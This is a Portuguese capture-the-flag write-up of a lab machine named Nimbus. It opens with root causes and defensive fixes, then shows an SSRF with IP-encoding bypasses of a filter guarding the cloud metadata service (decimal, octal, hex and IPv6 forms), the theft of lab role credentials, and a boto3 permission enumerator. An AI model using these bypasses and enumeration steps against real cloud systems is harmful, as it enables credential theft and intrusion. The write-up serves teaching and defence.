
```file:licoes
## 🔍 Vulnerabilidades Encontradas (Root Cause)

1. **SSRF com Bypass de Filtro de Input (Falta de validação robusta):** O endpoint `/jobs` aceitava uma URL externa para ler arquivos YAML. A aplicação tentava bloquear requisições internas (como para `169.254.169.254`) usando uma validação baseada em texto simples (Regex/String matching). Ao converter o IP para o formato decimal inteiro (`2852039166`), a aplicação não reconheceu o IP proibido, mas o sistema subjacente resolveu a requisição normalmente, permitindo o roubo das credenciais do IMDSv1.
    
2. **Desserialização Insegura / Execução Arbitrária em Workers:** O worker consumia mensagens da fila SQS do LocalStack. A falha residia no fato de que o worker aceitava um campo arbitrário chamado `script` dentro do JSON/YAML e o executava diretamente usando Python ou interpretador Bash.
    
3. **Perímetro de Rede Inseguro e Falta de Autenticação Interna (LocalStack Community):** A arquitetura dependia do proxy Nginx externo (`aws.nimbus.htb`) para aplicar as políticas restritas do IAM. No entanto, uma vez que o atacante obteve RCE dentro do container do worker, ele ganhou acesso à rede interna e pôde falar diretamente com o LocalStack na porta `floci:4566`. Como a versão comunitária do LocalStack aceita qualquer requisição interna como administrador (bypass total de IAM), o atacante virou "root" do ambiente cloud simulado.
    
4. **Escape de Container via PrivilegedMode + Modprobe:** O container do CodeBuild foi configurado para rodar com `privilegedMode: True`. Isso dá ao container acesso quase irrestrito ao hardware e ao kernel do Host. Escrever no `/proc/sys/kernel/modprobe` do kernel compartilhado permitiu que o container alterasse o binário executado pelo Host para carregar novos módulos, resultando no escape completo para o sistema principal.
    

## 🔴 Visão de Red Team (O Olhar do Atacante)

- **Abuso de Nuvem (Cloud-Oriented):** O Red Team aproveitou uma falha web tradicional (SSRF) para pivotar imediatamente para a infraestrutura de nuvem. Em ambientes modernos, chaves e metadados de instâncias (IMDS) são o "ouro" que permite o movimento lateral.
    
- **Exploração de Arquiteturas de Microserviços:** O ataque demonstra que não é preciso atacar o servidor principal diretamente se você puder injetar dados em filas (SQS) que alimentam workers em background.
    
- **Bypass de Controles Locais:** Identificar que o controle de segurança (IAM) só existia na "casca" (Nginx) e que o core da aplicação (LocalStack) confiava cegamente em conexões locais ilustra o princípio de que controles de borda não substituem a segurança em camadas (Zero Trust).
    

## 🔵 Visão de Blue Team (O Olhar do Defensor)

Se você fosse o Engenheiro de Segurança ou o Administrador desse ambiente, aqui estão as ações corretivas que teriam quebrado a Kill Chain do atacante:

### 1. Corrigir o SSRF e Migrar para IMDSv2

- **Filtro de IP:** Nunca valide IPs usando apenas filtros de texto (Regex). A validação correta de SSRF exige que a aplicação faça a resolução DNS da URL fornecida e valide o endereço IP retornado contra uma lista negra de IPs privados (RFC 1918) antes de iniciar a conexão.
    
- **IMDSv2 Obrigatório:** Configurar a instância AWS EC2 para exigir estritamente o **IMDSv2** (`HttpTokens: required`). O IMDSv2 exige uma requisição `PUT` prévia para gerar um token de sessão, o que neutraliza a enorme maioria dos ataques baseados em SSRF simples (que só realizam requisições `GET`).
    

### 2. Implementar o Menor Privilégio (Least Privilege) real

- Mesmo que o Nginx aplicasse o IAM, o backend (LocalStack) precisaria estar configurado para exigir autenticação mútua (mTLS) ou chaves válidas mesmo para tráfego de rede interna, eliminando o comportamento de "confiar em tudo que vem de dentro".
    

### 3. Endurecimento de Containers (Container Hardening)

- **Desativar PrivilegedMode:** Projetos de CI/CD (como CodeBuild ou Jenkins) raramente precisam de privilégios reais de Root no kernel do host (`privilegedMode: True`). O uso de ferramentas de build em user-space (como Kaniko) elimina a necessidade de expor o socket do Docker ou o kernel.
    
- **Proteção de Procfs:** Bloquear a capacidade de containers gravarem em diretórios sensíveis do kernel do host, como `/proc/sys/kernel/`, usando perfis AppArmor ou Seccomp customizados.
```


Nimbus
Tags: AWS
Nível: Difícil
pwned: Yes
Mapa do ataque
```python
[1] Recon            nmap + gobuster + ffuf  →  acha aws.nimbus.htb e a feature /jobs
        │
[2] SSRF             /jobs busca uma URL que você controla
        │
[3] Bypass de filtro IP especial bloqueado → reescrita do IP (decimal/octal)
        │
[4] Roubo de creds   IMDS (169.254.169.254) devolve credenciais temporárias da role
        │
[5] Enum IAM         boto3 testa permissões → só sqs:ListQueues + SendMessage liberados
        │
[6] RCE              send_message injeta job malicioso → worker executa → reverse shell
        │
[7] PrivEsc          CodeBuild privilegiado + truque do modprobe → escape pra host → root
```
Nmap
```jsx
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGsUbYkfB8pMEvFAGi5paPNGhksvnw0eRjwGZ4AlHmJIysuuzTNQaX/bcOE08prJ2+cOxCyMh5lG38v7rPC+Dag=
|   256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIByNLKDy0k2w61ihV1fOWk1bHErDkuYcwcYxN1vWpGrb
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Nimbus \xE2\x80\x94 Internal Job Scheduler
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
           Raw packets sent: 1092 (48.024KB) | Rcvd: 1092 (43.676KB)

```
Fuzzing de diretórios e subdomínios
```jsx
gobuster dir -u http://nimbus.htb/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nimbus.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
jobs                 (Status: 200) [Size: 3453]
login                (Status: 200) [Size: 876]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================

```
```jsx
ffuf -u http://nimbus.htb/ -w /opt/fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.nimbus.htb" -mc 200-299,301,302,307,401,403,405,500 -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nimbus.htb/
 :: Wordlist         : FUZZ: /opt/fuzzDicts/subdomainDicts/main.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 180ms]
:: Progress: [167378/167378] :: Job [1/1] :: 183 req/sec :: Duration: [0:15:06] :: Errors: 0 ::
```
Coloque no /etc/hosts
```jsx
aws.nimbus.htb
```
![image.png](image.png)
```jsx
┌──(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# cat > test.yaml << 'EOF'
name: test-job
schedule: "0 2 * * *"
runtime: python3.11
EOF
┌──(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```
```jsx
http://10.10.16.94:8081/test.yaml
```
![image.png](image%201.png)
```jsx
┌──(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.18.209 - - [21/Jun/2026 21:18:18] "GET /test.yaml HTTP/1.1" 200 -
```
`169.254.169.254` é o IMDS (Instance Metadata Service) da AWS — um endereço IP especial e fixo (link-local) que existe dentro de toda instância EC2. Quando uma aplicação roda numa instância EC2 com uma IAM Role anexada, ela pode consultar esse endereço para pegar credenciais temporárias da AWS sem precisar guardar uma chave fixa no código.
O caminho `/latest/meta-data/iam/security-credentials/` é a rota documentada da própria AWS para listar quais roles estão disponíveis, e depois `/latest/meta-data/iam/security-credentials/<nome-da-role>` devolve o `AccessKeyId`, `SecretAccessKey` e `SessionToken` daquela role.
Rotas relevantes:
```python
/latest/meta-data/iam/security-credentials/              → lista as roles
/latest/meta-data/iam/security-credentials/<nome-role>   → devolve AccessKey/Secret/Token
```
Por isso, vamos testar
```jsx
http://169.254.169.254/latest/meta-data/iam/security-credentials/?barroboy=test.yaml
```
Esses retornaram
`Error: Security policy: this URL targets an internal resource and has been blocked.`
Vamos testar
1. Octal (com zero à esquerda)
```jsx
http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?barroboy=test.yaml
```
2. Decimal inteiro (IP como um único número)
```jsx
http://2852039166/latest/meta-data/iam/security-credentials/?barroboy=test.yaml
```
3. Hexadecimal
```jsx
http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/?barroboy=test.yaml
```
4. IPv6 mapeado
```jsx
http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/?barroboy=test.yaml

```
O primeiro e o segundo funcionaram, retornaram o nome da role
```python

Fetched: http://2852039166/latest/meta-data/iam/security-credentials/?barroboy=test.yaml · HTTP 200
Raw response

nimbus-web-role

Parsed

nimbus-web-role
```
```jsx
Fetched: http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?barroboy=.yaml · HTTP 200
Raw response

{
  "Code": "Success",
  "LastUpdated": "2026-06-21T21:26:17Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-22T03:26:17Z"
}

Parsed

{'Code': 'Success', 'LastUpdated': '2026-06-21T21:26:17Z', 'Type': 'AWS-HMAC', 'AccessKeyId': 'ASIAQX4PG7L2K9M3N5R8', 'SecretAccessKey': 'bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs', 'Token': 'IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM', 'Expiration': '2026-06-22T03:26:17Z'}

```
Próximo passo é configurar essas credenciais AWS CLI e enumerar o que essa role tem permissão de acessar:
```jsx
aws configure --profile nimbus
# AWS Access Key ID: ASIAQX4PG7L2K9M3N5R8
# AWS Secret Access Key: bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
# AWS Session Token: IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM
# Default region: us-east-1
# Default output: json
```
Testando:
```jsx
kali@barroboy:~$ aws sts get-caller-identity --profile nimbus --endpoint-url http://aws.nimbus.htb
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
                                                                                                                        
kali@barroboy:~$ aws s3 ls --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListAllMyBuckets on resource: *
                                                                                                                        
kali@barroboy:~$ aws iam list-attached-role-policies --role-name nimbus-web-role --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: iam:ListAttachedRolePolicies on resource: *
                                                                                                                        
kali@barroboy:~$ aws iam list-role-policies --role-name nimbus-web-role --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListRolePolicies operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: unknown:ListRolePolicies on resource: *
                                                                                                                        
kali@barroboy:~$ aws s3 ls s3://nimbus --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus
                                                                                                                        
kali@barroboy:~$ aws s3 ls s3://nimbus-backups --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus-backups
                                                                                                                        
kali@barroboy:~$ aws s3 ls s3://nimbus-web --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus-web
                                                                                                                        
kali@barroboy:~$ aws s3 ls s3://nimbus-jobs --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus-jobs
                                                                                                                        
kali@barroboy:~$ aws s3 ls s3://nimbus-labs --profile nimbus --endpoint-url http://aws.nimbus.htb

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus-labs

```
Vamos utilizar um script enumerador de permissões IAM em Python usando `boto3`. Ele pega as credenciais temporárias (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) e testa, uma por uma, uma lista de chamadas de API "read-only" comuns em vários serviços AWS (S3, EC2, Lambda, DynamoDB, SQS, IAM, etc.), contra o endpoint `aws.nimbus.htb`
Pra cada chamada, ele:
Tenta executar (ex: `s3.list_buckets()`, `lambda.list_functions()`)
Se funcionar → imprime `[ALLOWED]` e mostra um trecho do resultado
Se der erro → imprime `[DENIED]`, e na versão que sugeri, tenta diferenciar se foi a política IAM que negou (mensagem tipo `AccessDenied`/`not authorized`) ou se foi um bloqueio anterior do proxy nginx (403 vazio, sem o XML de erro padrão da AWS)
```python
import boto3, json
session = boto3.Session(
    aws_access_key_id="ASIAQX4PG7L2K9M3N5R8",
    aws_secret_access_key="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
    aws_session_token="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
    region_name="us-east-1",
)

checks = [
    ("ec2", "describe_instances", {}),
    ("s3", "list_buckets", {}),
    ("lambda", "list_functions", {}),
    ("dynamodb", "list_tables", {}),
    ("sqs", "list_queues", {}),
    ("sns", "list_topics", {}),
    ("kms", "list_keys", {}),
    ("cloudformation", "list_stacks", {}),
    ("route53", "list_hosted_zones", {}),
    ("logs", "describe_log_groups", {}),
    ("ssm", "describe_instance_information", {}),
    ("secretsmanager", "list_secrets", {}),
    ("iam", "list_users", {}),
    ("iam", "list_roles", {}),
    ("ecs", "list_clusters", {}),
    ("ecr", "describe_repositories", {}),
]

for service, method, kwargs in checks:
    try:
        client = session.client(service, endpoint_url="http://aws.nimbus.htb")
        result = getattr(client, method)(**kwargs)
        print(f"[ALLOWED] {service}.{method}")
        print(json.dumps(result, default=str, indent=2)[:500])
    except Exception as e:
        msg = str(e)
        # diferencia "negado pela IAM" de "bloqueado pelo proxy/nginx"
        if "403" in msg and "AccessDenied" not in msg and "not authorized" not in msg:
            print(f"[PROXY-BLOCKED?] {service}.{method} -> {msg[:200]}")
        else:
            print(f"[DENIED]  {service}.{method} -> {msg[:200]}")
    print("---")
```
```python
[DENIED]  ec2.describe_instances -> An error occurred (AccessDenied) when calling the DescribeInstances operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: unknown:De
---
[DENIED]  s3.list_buckets -> An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListAllMyBuck
---
[DENIED]  lambda.list_functions -> An error occurred (403) when calling the ListFunctions operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>

---
[DENIED]  dynamodb.list_tables -> An error occurred (403) when calling the ListTables operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Me
---
[ALLOWED] sqs.list_queues
{
  "QueueUrls": [
    "http://floci:4566/847219365028/nimbus-jobs"
  ],
  "ResponseMetadata": {
    "RequestId": "df1a2d27-31f9-42a0-b0e1-d26b4c65db8c",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "server": "nginx/1.24.0 (Ubuntu)",
      "date": "Sun, 21 Jun 2026 21:41:41 GMT",
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "60",
      "connection": "keep-alive",
      "x-amz-id-2": "df1a2d27-31f9-42a0-b0e1-d26b4c65db8c",
      "x-amz-request
---
[DENIED]  sns.list_topics -> An error occurred (AccessDenied) when calling the ListTopics operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: sns:ListTopics on
---
[DENIED]  kms.list_keys -> An error occurred (403) when calling the ListKeys operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Mess
---
[DENIED]  cloudformation.list_stacks -> An error occurred (AccessDenied) when calling the ListStacks operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: unknown:ListStack
---
[DENIED]  route53.list_hosted_zones -> An error occurred (AccessDenied) when calling the ListHostedZones operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:GetObject
---
[DENIED]  logs.describe_log_groups -> An error occurred (403) when calling the DescribeLogGroups operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>

---
[DENIED]  ssm.describe_instance_information -> An error occurred (403) when calling the DescribeInstanceInformation operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDeni
---
[DENIED]  secretsmanager.list_secrets -> An error occurred (403) when calling the ListSecrets operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <M
---
[DENIED]  iam.list_users -> An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: iam:ListUsers on r
---
[DENIED]  iam.list_roles -> An error occurred (AccessDenied) when calling the ListRoles operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: unknown:ListRoles
---
[DENIED]  ecs.list_clusters -> An error occurred (403) when calling the ListClusters operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <
---
[DENIED]  ecr.describe_repositories -> An error occurred (403) when calling the DescribeRepositories operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Cod
---

```
`sqs.list_queues` foi `[ALLOWED]` e devolveu uma fila real: `nimbus-jobs` rodando em `floci:4566`. `4566` é a porta padrão do LocalStack (emulador local de AWS usado em dev/teste), o que confirma que esse ambiente todo é simulado com LocalStack — explica os erros 403 "vazios" do nginx antes (provavelmente é o LocalStack/proxy filtrando certas rotas, não a AWS real).
Próximo passo natural: já que temos permissão de `sqs:ListQueues`, vamos testar as outras ações de SQS nessa fila específica:
```python
import boto3, json

session = boto3.Session(
    aws_access_key_id="ASIAQX4PG7L2K9M3N5R8",
    aws_secret_access_key="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
    aws_session_token="<TOKEN_COMPLETO_DO_IMDS_AQUI>",
    region_name="us-east-1",
)

sqs = session.client("sqs", endpoint_url="http://aws.nimbus.htb")
queue_url = "http://floci:4566/847219365028/nimbus-jobs"

resp = sqs.receive_message(
    QueueUrl=queue_url,
    MaxNumberOfMessages=10,
    WaitTimeSeconds=2,
    AttributeNames=["All"],
    MessageAttributeNames=["All"],
)
print(json.dumps(resp, default=str, indent=2))
```
```python
                                                                                                                        
┌──(venv)─(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# python3 aws_sqs.py
Traceback (most recent call last):
  File "/home/HTB/labs/nimbus/aws_sqs.py", line 13, in <module>
    resp = sqs.receive_message(
        QueueUrl=queue_url,
    ...<3 lines>...
        MessageAttributeNames=["All"],
    )
  File "/home/HTB/labs/nimbus/venv/lib/python3.13/site-packages/botocore/client.py", line 606, in _api_call
    return self._make_api_call(operation_name, kwargs)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/HTB/labs/nimbus/venv/lib/python3.13/site-packages/botocore/context.py", line 123, in wrapper
    return func(*args, **kwargs)
  File "/home/HTB/labs/nimbus/venv/lib/python3.13/site-packages/botocore/client.py", line 1094, in _make_api_call
    raise error_class(parsed_response, operation_name)
botocore.exceptions.ClientError: An error occurred (403) when calling the ReceiveMessage operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Message>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: sqs:ReceiveMessage on resource: nimbus-jobs</Message>
  </Error>
  <RequestId>x5660007-amv4-16e6-21r0-8b01j71af982</RequestId>
</ErrorResponse>

```
`sqs:ReceiveMessage` negado — então a permissão é só lista, não leitura. Isso fecha a SQS como caminho direto.
```python
import boto3, json

session = boto3.Session(
    aws_access_key_id="ASIAQX4PG7L2K9M3N5R8",
    aws_secret_access_key="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
    aws_session_token="<TOKEN_COMPLETO>",
    region_name="us-east-1",
)

sqs = session.client("sqs", endpoint_url="http://aws.nimbus.htb")
queue_url = "http://floci:4566/847219365028/nimbus-jobs"

extra_checks = [
    ("get_queue_attributes", {"QueueUrl": queue_url, "AttributeNames": ["All"]}),
    ("list_dead_letter_source_queues", {"QueueUrl": queue_url}),
    ("list_queue_tags", {"QueueUrl": queue_url}),
    ("send_message", {"QueueUrl": queue_url, "MessageBody": "test"}),
]

for method, kwargs in extra_checks:
    try:
        result = getattr(sqs, method)(**kwargs)
        print(f"[ALLOWED] {method}")
        print(json.dumps(result, default=str, indent=2)[:800])
    except Exception as e:
        print(f"[DENIED]  {method} -> {str(e)[:200]}")
    print("---")
```
```python
──(venv)─(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# python3 aws_sqs_new.py
[ALLOWED] get_queue_attributes
{
  "Attributes": {
    "DelaySeconds": "0",
    "MessageRetentionPeriod": "345600",
    "MaximumMessageSize": "262144",
    "VisibilityTimeout": "30",
    "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
    "CreatedTimestamp": "1782073001",
    "LastModifiedTimestamp": "1782073001",
    "ApproximateNumberOfMessages": "0",
    "ApproximateNumberOfMessagesNotVisible": "0"
  },
  "ResponseMetadata": {
    "RequestId": "5937ed71-5d19-4c2c-a312-04ef0a0538ce",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "server": "nginx/1.24.0 (Ubuntu)",
      "date": "Sun, 21 Jun 2026 21:46:08 GMT",
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "331",
      "connection": "keep-alive",
      "x-amz-id-2": "5937ed71-5d19-4c2c-a312-04ef0a0538ce",
---
[DENIED]  list_dead_letter_source_queues -> An error occurred (403) when calling the ListDeadLetterSourceQueues operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenie
---
[DENIED]  list_queue_tags -> An error occurred (403) when calling the ListQueueTags operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>

---
[ALLOWED] send_message
{
  "MD5OfMessageBody": "098f6bcd4621d373cade4e832627b4f6",
  "MessageId": "0a964d74-0350-4df4-b3e6-bf54f8c2bcda",
  "ResponseMetadata": {
    "RequestId": "92877f55-5e25-4e40-82e0-ecd7bb99f640",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "server": "nginx/1.24.0 (Ubuntu)",
      "date": "Sun, 21 Jun 2026 21:46:09 GMT",
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "106",
      "connection": "keep-alive",
      "x-amz-id-2": "92877f55-5e25-4e40-82e0-ecd7bb99f640",
      "x-amz-request-id": "92877f55-5e25-4e40-82e0-ecd7bb99f640",
      "x-amzn-requestid": "92877f55-5e25-4e40-82e0-ecd7bb99f640"
    },
    "RetryAttempts": 0
  }
}
---

```
`send_message` foi `[ALLOWED]`. A `nimbus-web-role` pode escrever na fila `nimbus-jobs`, mesmo sem poder ler de volta.
Ou seja, podemos escrever (`SendMessage`), mas não ler (`ReceiveMessage`). Significa que possivelmente existe um worker do outro lado consumindo o que escrevemos. Se ele executa o conteúdo do YAML de forma insegura, temos um caminho pra RCE.
Pela página `/jobs`, vemos um job documentado tem só três campos: `name`, `schedule` e `runtime`.
